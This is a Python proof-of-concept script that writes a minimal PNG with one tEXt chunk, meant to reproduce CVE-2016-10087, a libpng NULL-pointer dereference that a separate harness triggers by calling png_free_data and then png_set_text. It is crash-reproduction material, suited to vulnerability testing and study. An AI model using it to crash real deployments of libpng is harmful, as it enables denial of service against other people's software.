#!/usr/bin/env python3
"""
PoC input for CVE-2016-10087 — libpng NULL dereference in png_set_text_2.

This generates a valid PNG with one tEXt chunk.  The chunk causes libpng to
allocate info_ptr->text (max_text=9, num_text=1).  The reproducer harness then
calls png_free_data(PNG_FREE_TEXT,-1), which sets text=NULL and num_text=0 but
leaves max_text=9.  The next png_set_text call checks 0+1 > 9 → false, skips
the realloc branch, and dereferences the NULL text pointer.
"""
import struct
import zlib

def make_chunk(chunk_type: bytes, data: bytes) -> bytes:
    crc = zlib.crc32(chunk_type + data) & 0xFFFFFFFF
    return struct.pack('>I', len(data)) + chunk_type + data + struct.pack('>I', crc)

PNG_SIG = b'\x89PNG\r\n\x1a\n'

# 1x1 8-bit grayscale — simplest valid image the harness will accept
ihdr = struct.pack('>IIBBBBB', 1, 1, 8, 0, 0, 0, 0)

# tEXt chunk: key\0text  (key must be 1-79 printable Latin-1 chars)
text_data = b'Comment\x00CVE-2016-10087 reproducer'

# IDAT: filter byte 0 + one 0x80 pixel, zlib-compressed
idat = zlib.compress(b'\x00\x80')

poc = (PNG_SIG
       + make_chunk(b'IHDR', ihdr)
       + make_chunk(b'tEXt', text_data)
       + make_chunk(b'IDAT', idat)
       + make_chunk(b'IEND', b''))

out = 'poc_cve_2016_10087.png'
with open(out, 'wb') as f:
    f.write(poc)
print(f'Written {len(poc)} bytes → {out}')
